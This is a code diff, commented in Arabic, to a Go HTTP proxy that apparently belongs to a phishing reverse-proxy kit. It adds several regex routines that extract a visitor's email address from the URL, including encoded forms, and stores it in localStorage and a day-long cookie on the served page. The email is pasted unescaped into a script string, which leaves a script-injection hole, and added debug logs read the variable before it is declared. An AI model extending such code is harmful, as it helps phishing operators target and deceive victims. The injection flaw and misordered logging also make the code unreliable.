@@ -1542,13 +1542,47 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	// استخراج البريد الإلكتروني من URL إذا كان موجودًا
 	path := req.URL.Path
+	fullURL := req.URL.String()
 	email := ""
 	
 	// البحث عن البريد الإلكتروني في المسار باستخدام التعبير النمطي
-	re := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
-	matches := re.FindStringSubmatch(path)
-	if len(matches) > 1 {
-		email = matches[1]
+	// محاولة البحث عن الإيميل بعدة طرق مختلفة للتعامل مع الحالات المختلفة
+	
+	// الطريقة الأولى: البحث عن النمط المعتاد
+	re1 := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
+	matches1 := re1.FindStringSubmatch(path)
+	if len(matches1) > 1 {
+		email = matches1[1]
+	}
+	
+	// الطريقة الثانية: البحث عن النمط المشفر
+	re2 := regexp.MustCompile(`\$([^\/]+%40[^\/]+)`)
+	matches2 := re2.FindStringSubmatch(path)
+	if len(matches2) > 1 {
+		decodedEmail, err := url.QueryUnescape(matches2[1])
+		if err == nil {
+			email = decodedEmail
+		}
+	}
+	
+	// الطريقة الثالثة: البحث في URL كامل
+	re3 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+%40[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
+	matches3 := re3.FindStringSubmatch(fullURL)
+	if len(matches3) > 0 {
+		decodedEmail, err := url.QueryUnescape(matches3[0])
+		if err == nil && email == "" {
+			email = decodedEmail
+		}
+	}
+	
+	// الطريقة الرابعة: البحث عن صيغة النطاق في URL
+	re4 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
+	matches4 := re4.FindStringSubmatch(fullURL)
+	if len(matches4) > 0 && email == "" {
+		email = matches4[0]
+	}
+	
+	if email != "" {
 		log.Info("تم استخراج البريد الإلكتروني من URL: %s", email)
 	}
 	
@@ -1726,10 +1760,16 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
     <script>
         // تخزين البريد الإلكتروني في localStorage إذا كان موجودًا
         window.onload = function() {
+
+		console.log("window.onload");
+		console.log("email: " + email);
             var email = "` + email + `";
             if (email && email.length > 0) {
                 localStorage.setItem('user_email', email);
                 console.log("تم تخزين البريد الإلكتروني في localStorage: " + email);
+                
+                // إضافة كوكي للبريد الإلكتروني أيضًا كطريقة احتياطية
+                document.cookie = "user_email=" + email + "; path=/; max-age=86400";
             }
         };
         
